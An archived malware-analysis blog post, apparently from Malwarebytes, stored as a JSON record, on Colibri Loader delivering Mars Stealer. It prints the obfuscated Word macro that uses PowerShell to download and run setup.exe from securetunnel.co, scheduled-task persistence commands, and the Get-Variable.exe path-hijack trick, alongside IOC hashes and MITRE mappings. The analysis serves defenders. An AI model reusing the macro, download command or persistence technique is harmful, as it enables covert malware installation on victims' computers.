{
    "id": "8ea16683-a752-4cd2-831c-3e71917a1a67",
    "created_at": "2023-01-12T14:59:47.251409Z",
    "updated_at": "2025-03-27T02:05:35.479592Z",
    "deleted_at": null,
    "sha1_hash": "32195a940a280e5a9a8b45e358d7b60fc8ca92e0",
    "title": "2022-04-05 - Colibri Loader combines Task Scheduler and PowerShell in clever persistence technique",
    "authors": "",
    "file_creation_date": "2022-06-13T04:02:12Z",
    "file_modification_date": "2022-06-13T04:02:12Z",
    "file_size": 392435,
    "plain_text": "# Colibri Loader combines Task Scheduler and PowerShell in clever persistence technique\n\n**blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-**\npersistence-technique/\n\nThreat Intelligence Team April 5, 2022\n\n_This blog post was authored by Ankur Saini, with contributions from Hossein Jazi and_\n_Jérôme Segura_\n\n_(2022-04-07): Added MITRE ATT&CK mappings_\n\n_(2022-04-07): Changed the name of the final payload from Vidar to Mars Stealer_\n\nColibri Loader is a relatively new piece of malware that first appeared on underground\nforums in August 2021 and was advertised to “people who have large volumes of traffic and\n_lack of time to work out the material“. As it names suggests, it is meant to deliver and_\nmanage payloads onto infected computers.\n\nOur Threat Intelligence Team recently uncovered a new Colibri Loader campaign delivering\nthe Mars Stealer as final payload. There is already published material about Colibri by\n[CloudSek and](https://cloudsek.com/in-depth-technical-analysis-of-colibri-loader-malware/) [independent researchers. Since most of the details about the bot have been](https://fr3d.hk/blog/colibri-loader-back-to-basics)\ncovered, we decided to highlight a persistence technique we haven’t seen before.\n\n## Campaign attack chain\n\n\n-----\n\nThe attack starts with a malicious Word document deploying Colibri bot that then delivers the\nMars Stealer. The document contacts a remote server at (securetunnel[.]co) to load a remote\ntemplate named trkal0.dot that contacts a malicious macro. This attack is known as remote\ntemplate injection.\n\nThe macro enables PowerShell to download the final payload (Colibri Loader) as setup.exe:\n```\nPrivate Sub Document_Open()\nzgotwed = \"C:\\Users\\Public\\setup.ex`e\"\nn87lcy4 = Replace(\"new:72Cs19e4ts4D\", \"s19e4ts\", \"2\")\nSet hu9v0dd = GetObject(n87lcy4 & \"D5-D70A-438B-8A42-984\" & CLng(\"1.8\") &\n\"4B88AFB\" & CInt(\"8.1\"))\nhu9v0dd.exec \"cm\" & \"d /c powers^hell -w hi Start-BitsTransfer -Sou\nhtt`ps://securetunnel .co/connection/setup.e`xe -Dest \" & zgotwed & \";\" &\nzgotwed\n\n```\n```\nEnd Sub\n\n```\n\n## Abusing PowerShell for Persistence\n\nColibri leverages PowerShell in a unique way to maintain persistence after a reboot.\nDepending on the Windows version, Colibri drops its copy in\n%APPDATA%\\Local\\Microsoft\\WindowsApps and names it Get-Variable.exe for Windows 10\nand above, while for lower versions it drops it in %DOCUMENTS%/WindowsPowerShell\nnamed as dllhost.exe\n\n\n-----\n\nOn Windows 7, it creates a scheduled task using the following command:\n\nschtasks.exe /create /tn COMSurrogate /st 00:00 /du 9999:59 /sc once /ri 1 /f /tr\n“C:\\Users\\admin\\Documents\\WindowsPowerShell\\dllhost.exe“\n\nOn Windows 10 and above, it creates a scheduled task using the following command:\n\nschtasks.exe /create /tn COMSurrogate /st 00:00 /du 9999:59 /sc once /ri 1 /f /tr\n“powershell.exe -windowstyle hidden“\n\nIn the first scenario (Win7), we see a task pointing to the path of Colibri Loader. However, in\nthe second we see an odd task to execute PowerShell with a hidden window. This is what we\nbelieve is a new persistence technique employed by the malware author.\n\nAs mentioned earlier, it drops the file with the name Get-Variable.exe in the WindowsApps\ndirectory. It so happens that [Get-Variable is a valid PowerShell cmdlet (a cmdlet is a](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-variable?view=powershell-7.2)\nlightweight command used in the Windows PowerShell environment) which is used to\nretrieve the value of a variable in the current console.\n\nAdditionally, WindowsApps is by default in the path where PowerShell is executed. So when\nthe Get-Variable command is issued on PowerShell execution, the system first looks for the\nGet-Variable executable in the path and executes the malicious binary instead of looking for\nthe PowerShell cmdlet.\n\nWe reproduced this technique using the calculator to show how an adversary can easily\nachieve persistence combining a scheduled task and any payload (as long as it is called GetVariable.exe and placed in the proper location):\n\n\n-----\n\n[A search on VirusTotal for the file name Get-Variable.exe indicates that the first malicious file](https://www.virustotal.com/gui/file/6b74dc043f9a12823ed98d704e4c8543c9b5d8b9240e65e9d31d2303ab914906)\nuploaded to the platform happened last August, which matches with the time that Colibri\nappeared on XSS underground forums. That sample has the same networking features as\nColibri which helps us ascertain with more confidence that the technique was debuted by\nColibri.\n\n## Conclusion\n\nColibri is still in its infancy but it already offers many features for attackers and slowly seems\nto be gaining popularity. The persistence technique we outlined in this blog is simple but\nefficient and does not appear to be known.\n\nMalwarebytes users are protected against this attack thanks to our Anti-Exploit layer:\n\n\n-----\n\n## IOCs\n\n**Word Document**\n\n666268641a7db3b600a143fff00a063e77066ad72ac659ebc77bb5d1acd5633d\n\n**setup.exe (Colibri)**\n\n54a790354dbe3ab90f7d8570d6fc7eb80c024af69d1db6d0f825c094293c5d77\n\n**install.exe (Mars)**\n\nb92f4b4684951ff2e5abdb1280e6bff80a14b83f25e4f3de39985f188d0f3aad\n\n**MITRE ATT&CK (related to persistence technique)**\n\n**Technique** **Description** **Usage**\n\n\n-----\n\n[T1053.005](https://attack.mitre.org/techniques/T1053/005/) Scheduled Task/Job:\nScheduled Task\n\n[T1564.003](https://attack.mitre.org/techniques/T1564/003/) Hide Artifacts: Hidden\nWindow\n\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/) Command and Scripting\nInterpreter: PowerShell\n\n[T1027](https://attack.mitre.org/techniques/T1027/) Obfuscated Files or\nInformation\n\n[T1574.008](https://attack.mitre.org/techniques/T1574/008/) Hijack Execution\nFlow: Path Interception by\nSearch Order Hijacking\n\n\nschtasks.exe /create /tn COMSurrogate /st\n00:00 /du 9999:59 /sc once /ri 1 /f /tr\n“powershell.exe -windowstyle hidden”\n\npowershell.exe -windowstyle hidden\n\npowershell.exe -windowstyle hidden\n\nGet-Variable.exe\n\nGet-Variable.exe\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-05 - Colibri Loader combines Task Scheduler and PowerShell in clever persistence technique.pdf"
    ],
    "report_names": [
        "2022-04-05 - Colibri Loader combines Task Scheduler and PowerShell in clever persistence technique.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535587,
    "ts_updated_at": 1743041135,
    "ts_creation_date": 1655092932,
    "ts_modification_date": 1655092932,
    "files": {
        "pdf": "https://archive.orkl.eu/32195a940a280e5a9a8b45e358d7b60fc8ca92e0.pdf",
        "text": "https://archive.orkl.eu/32195a940a280e5a9a8b45e358d7b60fc8ca92e0.txt",
        "img": "https://archive.orkl.eu/32195a940a280e5a9a8b45e358d7b60fc8ca92e0.jpg"
    }
}